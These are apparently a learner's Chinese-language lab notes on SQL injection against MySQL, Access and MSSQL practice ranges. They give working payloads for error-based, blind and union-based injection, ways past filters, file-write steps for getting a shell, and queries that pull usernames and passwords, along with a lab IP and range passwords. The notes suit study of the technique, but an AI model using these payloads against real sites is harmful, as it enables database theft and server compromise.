day6

>   -   sql语法规则
>
>   >   -   select 列名 from 表名 where 条件

mysql注入

>   -   ʻ，ʼʻ，1/1，1/0
>
>   >   -   -1ʼ or 1=1 or 1=1，-1ʻ or 1=2
>
>   -    test3.php：id=(select+extractvalue(1,concat(0x7e,database(),0x7e)))+as+ss
>   -    =被过滤，替换
>
>   >   -   like
>   >   -    in：in(1)
>
>   -   and,or被过滤
>
>   >   -   ||（or） &&(and) xor
>   >   -   url编码：&&-----》%26%26
>
>   -   getshell（mysql,mssql）
>
>   >   -   两个必要条件：
>   >
>   >   >   -   1、root用户（最高权限）
>   >   >   -   2、知道绝对路径
>   >   >
>   >   >   >   -   文件上传漏洞成功利用的三个条件
>   >   >   >
>   >   >   >   >   -   1、成功上传
>   >   >   >   >   -   2、能够被解析
>   >   >   >   >   -   3、知道绝对路径
>   >   >
>   >   >   -   读取函数，写入语句
>   >   >
>   >   >   >   -   load_file('绝对路径')
>   >   >   >   -    into outfile 将查询结果导出到一个文件中,以文本方式导出数据，所以可能存 在编码不匹配的问题，==导致脏数据产生==
>   >   >   >
>   >   >   >   >   -   lines terminated by 导入数据，以这个数据作为文本文件的结束符
>   >   >   >   >   -   lines starting by 导入数据，以这个数据作为文本文件的开始符
>   >   >   >   >   -   fields terminated by 导入数据时使用某个字符作为分割符
>   >   >   >
>   >   >   >   -   into dumpfile 将查询结果导出到一个文件中，以二进制格式导出数据，不会 自动进行编码转换
>   >   >
>   >   >   -   如果导入导出的数据库字符编码不匹配，可能会导致脏数据的产生

access注入：

>   -   access靶场的密码：12345678
>   -   墨者靶场  //IP地址 : 219.153.49.228 端口 : 45523 协议 : http
>
>   >   -   要使用联合查询的话，需要接具体的表名
>
>   -   注入
>
>   >   -   流程：判断数据库类型->判断表名->判断列名->判断列名长度->查出数据
>   >   -   asp网站常用数据库access/mssql
>   >
>   >   >   -   判断数据库
>   >   >
>   >   >   >   -   and exsits (select * from msysobjects)>0 access
>   >   >   >   -   and exsits (select * from sysobjects)>0 sqlserver
>   >   >
>   >   >   -    access数据库
>   >   >
>   >   >   >   -   没有库
>   >   >   >   -   结构 表——》字段——》数据
>   >   >
>   >   >   -   逐字破解法
>   >   >
>   >   >   >   -   查表：and exists (select * from 表名)
>   >   >   >   -   查列：and exists (select 列名 from 表名) //存在就返回正常页面，不存在 就报错。
>   >   >   >   -   查数据：1.确定此条数据字段（列名）长度2.确定asc数据(asc编码)
>   >   >
>   >   >   -   access联合注入需要具体表名
>   >   >
>   >   >   >   -   爆破表名：?id=1+exists+(select * from msysobjects)
>   >   >   >   -   爆破字段名：?id=1+exists+(select id from admin)
>   >   >   >   -   进一步爆出占位符：?id=1 union select 1,2,3,4,5 from admin 
>   >   >   >   -   获取账号密码：?id=1 union select 1,username,passwd,4,5 from admin

mssql

>   -   MSSQL靶场的密码：! @12qw
>   -   基础
>
>   >   -   初始库
>   >
>   >   >   -   master
>   >
>   >   -   表
>   >
>   >   >   -   sysdatabases——》master库中 //保存所有库明 name字段 数据库名
>   >   >   -   syobjects——》每个数据库都有此表 //保存数据库中的所有表 name id  xtype=ʼUʻ代表用户建立的
>   >   >   -   syscolumns——》每个数据库中都有此表 // 保存所有表李的字段名 name  id
>   >
>   >   -    MSSQL报错语句
>   >
>   >   >   -   1-user
>   >   >   -   1/user
>   >   >   -   convert(int,user)
>   >   >   -   db_name(）
>   >
>   >   -   常用函数
>   >
>   >   >   -   user
>   >   >   -    substring
>   >
>   >   -   墨者靶场
>   >
>   >   >   -   联合注入
>   >   >
>   >   >   >   -   找数据库名union all select 1,db_name(),'3','4'  //mssql属于强类型数据， 数据类型必须一致
>   >   >   >
>   >   >   >   >   -   mozhe_db_v2
>   >   >   >
>   >   >   >   -   查表名 id=-2+union+all+select+1,name,'3','4'+from+mozhe_db_v2.dbo.sysobjects+ where+xtype='U'
>   >   >
>   >   >   -   ?id=2 order by 4--+ 查字段
>   >   >   -   查回显位：?id=-2 union all select '1','2','3','4'--+ 
>   >   >   -   用户名和数据库名：?id=-2 union all select '1',user,db_name(),'4'--+
>   >   >   -   查表名：?id=-2 union all select '1','2',(select top 1 name from  mozhe_db_v2.dbo.sysobjects where xtype='u'),'4'--+ 
>   >   >   -   查字段：?id=-2 union all select '1','2',(select quotename(name) from  mozhe_db_v2.dbo.syscolumns where id=(select id from  mozhe_db_v2.dbo.sysobjects where name='manage') FOR XML PATH('')),'4'--+ 
>   >   >   -   查数据：?id=-2 union all select '1','2',(select top 1 username,password from  mozhe_db_v2.dbo.manage FOR XML PATH('')),'4'--+

url编码

>   -   %20----空格
>   -   %0a----换行
>   -   %26----&
>   -    %27----单引号

```
GRANT ALL PRIVILEGES ON 学生, 班级 TO U1 WITH GRANT OPTION;
GRANT SELECT, DELETE ON 学生表 TO U2;
GRANT UPDATE (家庭住址) ON 学生表 TO U2;
```

